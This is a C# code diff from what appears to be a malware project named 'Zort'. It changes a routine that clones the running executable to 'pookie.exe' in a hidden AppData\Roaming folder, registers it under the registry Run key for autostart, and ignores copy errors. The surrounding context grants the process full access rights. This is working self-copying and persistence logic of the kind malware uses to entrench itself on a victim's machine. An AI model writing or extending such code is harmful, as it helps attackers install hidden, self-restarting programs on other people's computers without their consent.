@@ -32,20 +32,29 @@ namespace zort
             NativeMethods.SetProcessPrivilege(ptr, NativeMethods.ProcessAccessRights.PROCESS_ALL_ACCESS);
         }
 
-        public static void CopyToPicturesAndScheduleRun(bool justCopy = false)
+        public static void CopyToTempAndScheduleRun(bool justCopy = false)
         {
-            string picsPath = "C:\\Users\\Public\\Pictures";
+            string AppdataRoaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+            string AppdataRoamingPookie = Path.Combine(AppdataRoaming, "Pookie");
             byte[] clone = CreateClone();
-            string clonePath = Path.Combine(picsPath, "pookie.exe");
+            string clonePath = Path.Combine(AppdataRoamingPookie, "pookie.exe");
             if(!justCopy)
             {
                 AddRegRun(clonePath);
             }
-            if (File.Exists(clonePath))
+
+            try
             {
-                File.Delete(clonePath);
+                if (File.Exists(clonePath))
+                {
+                    File.Delete(clonePath);
+                }
+                File.WriteAllBytes(clonePath, clone);
             }
-            File.WriteAllBytes(clonePath, clone);
+            catch (Exception ex)
+            {
+                Console.WriteLine($"## [Zort] Error copying file: {ex.Message}. ignoring");
+            }
 
             Console.WriteLine($"## [Zort] Created clone at {clonePath}");
         }
